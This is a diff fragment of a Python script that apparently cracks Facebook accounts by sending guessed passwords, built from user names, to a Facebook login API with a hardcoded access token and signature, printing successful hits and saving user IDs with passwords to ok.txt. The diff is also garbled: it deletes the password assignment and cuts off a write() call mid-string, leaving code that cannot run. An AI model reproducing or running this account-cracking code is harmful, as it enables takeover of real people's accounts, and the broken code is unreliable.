@@ -453,7 +453,7 @@ def b_menu_select():
 		                                                                                    ok.close()
 		                                                                                    oks.append(uid) 
 		                                                                                else:
-		                                                                                    pass11=name.lower()
+		                                                                                    
 		                                                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass11 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                                                    d=json.loads(q)
 		                                                                                    if 'www.facebook.com' in d['error_msg']:
@@ -466,7 +466,7 @@ def b_menu_select():
 		                                                                                        if 'access_token' in d:
 		                                                                                            print("\x1b[1;32m[WAHID-OK] \033[1;32m"+uid+" | "+pass11+"\x1b[1;37m")
 		                                                                                            ok=open("ok.txt","a")
-		                                                                                            ok.write(uid+" | "+pass11+"\n")
+		                                                                                            ok.write(uid+" |
 		                                                                                            ok.close()
 		                                                                                            oks.append(uid)                                                
 														
